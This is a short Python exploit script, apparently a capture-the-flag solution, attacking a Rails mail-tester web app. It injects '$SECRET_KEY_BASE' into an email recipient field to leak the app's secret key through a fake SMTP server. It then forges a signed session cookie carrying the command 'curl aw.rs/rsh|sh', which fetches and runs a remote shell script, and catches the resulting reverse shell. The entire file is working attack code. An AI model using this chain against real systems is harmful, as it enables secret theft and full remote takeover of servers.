#!/usr/bin/env python3

from pwn import *
import requests
import re

URL = "http://localhost:3000"

def exploit():
    p = listen(2525)

    s = requests.Session()
    resp = s.get(URL).text
    token = re.search('"authenticity_token" value="(.*)"', resp).group(1)

    resp = s.post(URL + "/login", data={
        "authenticity_token": token,
        "username": "vakzz",
        "password": "vakzz"
    }).text

    token = re.search('"authenticity_token" value="(.*)"', resp).group(1)

    resp = s.post(URL + "/email", data={
        "authenticity_token": token,
        "to": "will+\x01$SECRET_KEY_BASE@mail.aw.rs",
        "message": "hello"
    }).text

    p.wait_for_connection()
    p.sendline("220 hax")
    p.sendlineafter("EHLO", "250 Hi")
    p.sendlineafter("MAIL FROM", "250 Ok")
    p.recvuntil('RCPT TO:<"will+\x01')
    secret_key_base = p.recvuntil('"@mail.aw.rs>', drop=True)
    log.info("secret_key_base: {}".format(secret_key_base))
    p.sendline("250 Ok")
    p.sendlineafter("DATA", "354 End data with <CR><LF>.<CR><LF>")
    p.sendlineafter("hello", "250 Ok")
    p.sendlineafter("QUIT", "221 Bye")
    p.close()

    cookie = process(["ruby", "./create_payload.rb", "curl aw.rs/rsh|sh",
                     secret_key_base]).recvall().decode().strip()
    log.info("cookie: {}".format(cookie))

    p = listen(12345)

    status_code = s.get(
        URL, cookies={'_mail_tester_session': cookie}).status_code
    log.info("status_code: {}".format(status_code))

    p.wait_for_connection()
    p.interactive()


if __name__ == "__main__":
    exploit()
